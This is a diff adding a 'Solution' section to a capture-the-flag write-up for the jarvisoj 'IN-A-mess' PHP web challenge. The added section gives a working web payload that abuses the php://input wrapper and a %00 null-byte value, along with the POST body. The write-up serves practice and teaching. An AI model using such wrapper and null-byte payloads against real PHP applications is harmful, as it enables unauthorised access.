@@ -28,6 +28,14 @@ else
 ?>
 ```
 
+# Solution
+payload:
+```
+?id=a&a=php://input&b=%0011111
+
+POST:
+1112 is a nice lab!
+```
 
 # Refference 
 + [jarvisoj : IN-A-mess](http://web.jarvisoj.com:32780/index.php?id=1)
